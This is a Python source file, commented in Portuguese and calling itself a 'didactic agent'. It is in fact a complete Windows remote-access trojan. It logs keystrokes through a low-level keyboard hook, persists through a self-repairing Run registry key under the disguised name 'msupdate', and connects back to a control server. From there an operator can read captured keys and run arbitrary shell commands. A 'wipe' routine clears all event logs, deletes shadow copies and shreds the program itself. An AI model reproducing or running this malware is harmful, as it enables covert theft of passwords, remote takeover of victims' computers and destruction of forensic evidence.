#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Agente didático – persistência, keylogger, limpeza extrema
VERSÃO FINAL: wipe + suicídio + desligamento total
"""

from time import sleep
import subprocess, socket, os, threading, sys, ctypes, ctypes.wintypes, winreg, shutil, signal
from pathlib import Path
from ctypes import windll
from datetime import datetime as dt

# ---------------- CONFIG GLOBAL ---------------- #
IP        = "192.168.1.80"
PORT      = 443
LOG_FILE  = os.path.join(os.getenv("APPDATA"), "svchost.log")
MUTEX     = "Global\\msupdate42"
BUF, LOCK = "", threading.Lock()
RETRY_CUR = 1
DEBUG     = False
XOR_KEY   = 0x9F
EXE_PATH  = os.path.join(os.getenv("APPDATA"), "msupdate.exe")
WIPE_FLAG = False  # Controle de suicídio

# ------------------------------------------------------------------ #
#  FUNÇÕES AUXILIARES
# ------------------------------------------------------------------ #
def _xor(b: str) -> str:
    return "".join([chr(ord(c) ^ XOR_KEY) for c in b])

def log(msg: str) -> None:
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as fh:
            fh.write(f"[{dt.now():%d/%m %H:%M:%S}] {msg}\n")
    except Exception:
        pass

# ------------------------------------------------------------------ #
#  KEYLOGGER
# ------------------------------------------------------------------ #
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
HOOKPROCTYPE = ctypes.WINFUNCTYPE(ctypes.c_uint, ctypes.c_uint, ctypes.c_uint, ctypes.c_void_p)
hook_id = None

def low_level_handler(nCode, wParam, lParam):
    if wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
        vk = lParam[0] & 0xFF
        mapped = windll.user32.MapVirtualKeyA(vk, 2)
        char = ""
        if 32 <= mapped <= 126:
            char = chr(mapped)
            shift = windll.user32.GetKeyState(0x10) & 0x8000
            caps  = windll.user32.GetKeyState(0x14) & 1
            if shift ^ caps and char.isalpha():
                char = char.upper()
        elif vk == 13: char = "\n"
        elif vk == 9 : char = "\t"
        elif vk == 8 : char = "[BS]"
        if char:
            global BUF
            with LOCK:
                BUF += _xor(char)
                if len(BUF) > 65536:
                    BUF = BUF[-65536:]
    return windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)

def start_keylogger():
    global hook_id
    hook_id = windll.user32.SetWindowsHookExA(
        WH_KEYBOARD_LL, HOOKPROCTYPE(low_level_handler),
        windll.kernel32.GetModuleHandleA(None), 0)
    msg = ctypes.wintypes.MSG()
    while windll.user32.GetMessageA(ctypes.byref(msg), 0, 0, 0) != 0:
        pass

# ------------------------------------------------------------------ #
#  PERSISTÊNCIA
# ------------------------------------------------------------------ #
def persist():
    if not os.path.exists(EXE_PATH):
        shutil.copy2(sys.executable, EXE_PATH)
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                          r"Software\Microsoft\Windows\CurrentVersion\Run") as k:
        winreg.SetValueEx(k, "msupdate", 0, winreg.REG_SZ, EXE_PATH)

def persist_guardian():
    while True:
        sleep(60)
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Run") as k:
                val, _ = winreg.QueryValueEx(k, "msupdate")
        except:
            val = None
        if val != EXE_PATH:
            persist()

# ------------------------------------------------------------------ #
#  LIMPEZA EXTREMA + SUICÍDIO
# ------------------------------------------------------------------ #
def overwrite_then_unlink(path: str | Path):
    p = Path(path)
    if not p.exists():
        return
    try:
        sz = p.stat().st_size
        with p.open("r+b") as fh:
            fh.write(b"\x00" * sz)
        p.unlink()
    except Exception:
        pass

def cleanup_hardcore():
    overwrite_then_unlink(EXE_PATH)
    overwrite_then_unlink(LOG_FILE)
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_ALL_ACCESS) as k:
            winreg.DeleteValue(k, "msupdate")
    except Exception:
        pass
    ps = 'Get-WinEvent -ListLog * | Where-Object {$_.RecordCount -gt 0} | ForEach-Object { wevtutil cl $_.LogName }'
    subprocess.run(["powershell", "-NoProfile", "-Command", ps], capture_output=True)
    subprocess.run(["vshadow", "-da"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def suicide(delay: int = 3):
    """Sobrescreve o script original e mata o processo."""
    sleep(delay)
    try:
        overwrite_then_unlink(__file__)
    except Exception:
        pass
    os.kill(os.getpid(), signal.SIGTERM)

# ------------------------------------------------------------------ #
#  MENU INTERATIVO
# ------------------------------------------------------------------ #
def show_menu(s):
    menu = """
===④ Painel de Controle ===①
1 — Visualizar teclas capturadas (keys)
2 — Executar comando CMD
3 — Status de persistência
4 — LIMPAR TUDO (wipe/die) /SEM RASTRO/
5 — Sair
Escolha (1-5): """
    s.send(menu.encode())

def handle_command(s, cmd: str) -> bool:
    global WIPE_FLAG
    cmd = cmd.strip()
    if cmd == "1":
        global BUF
        with LOCK:
            chunk = BUF[-2048:]
        s.send(b"--- KEYS (xor 0x%02X) ---\n%s\n--- FIM ---\n" % (XOR_KEY, chunk.encode()))
        return True
    elif cmd == "2":
        s.send(b"CMD> ")
        cmd_line = s.recv(4096).decode().strip()
        if not cmd_line:
            return True
        try:
            out = subprocess.check_output(cmd_line, shell=True, stderr=subprocess.STDOUT, timeout=15)
            s.send(out + b"\n")
        except subprocess.TimeoutExpired:
            s.send(b"TIMEOUT (15 s)\n")
        except Exception as e:
            s.send(f"ERRO: {e}\n".encode())
        return True
    elif cmd == "3":
        info = ("Executavel: " + EXE_PATH + "\n" +
                "Registry  : HKCU\\Run\\msupdate\n" +
                "Log local : " + LOG_FILE + "\n" +
                "PID atual : " + str(os.getpid()) + "\n")
        s.send(info.encode())
        return True
    elif cmd in ("4", "/wipe", "/die", "exit"):
        s.send(b"[+] Wipe + shutdown self in 3 s...\n")
        cleanup_hardcore()
        s.close()
        WIPE_FLAG = True
        threading.Thread(target=lambda: suicide(3), daemon=True).start()
        return False
    else:
        s.send(b"[!] Opcao invalida\n")
        return True

# ------------------------------------------------------------------ #
#  CONEXÃO / LOOP PRINCIPAL
# ------------------------------------------------------------------ #
def connect_back():
    global RETRY_CUR
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((IP, PORT))
            RETRY_CUR = 1
            return s
        except Exception:
            log(f"Conexão falhou, re-tentando em {RETRY_CUR}s")
            sleep(RETRY_CUR)
            RETRY_CUR = min(RETRY_CUR * 2, 1800)

def main_loop():
    global WIPE_FLAG
    while True:
        sock = connect_back()
        if WIPE_FLAG:
            suicide(0)
            break
        if sock is None:
            continue
        log("Conectado ao C&C")
        try:
            while True:
                show_menu(sock)
                data = sock.recv(1024).decode(errors="ignore").strip()
                if not data:
                    break
                if not handle_command(sock, data):
                    break
        except Exception:
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass
            log("Desconectado do C&C – reconectando…")

# ------------------------------------------------------------------ #
#  ENTRADA DO PROGRAMA
# ------------------------------------------------------------------ #
if __name__ == "__main__":
    mutex = windll.kernel32.CreateMutexA(None, 1, MUTEX)
    if windll.kernel32.GetLastError() == 0xB7:
        sys.exit()
    persist()
    threading.Thread(target=persist_guardian, daemon=True).start()
    threading.Thread(target=start_keylogger, daemon=True).start()
    main_loop()
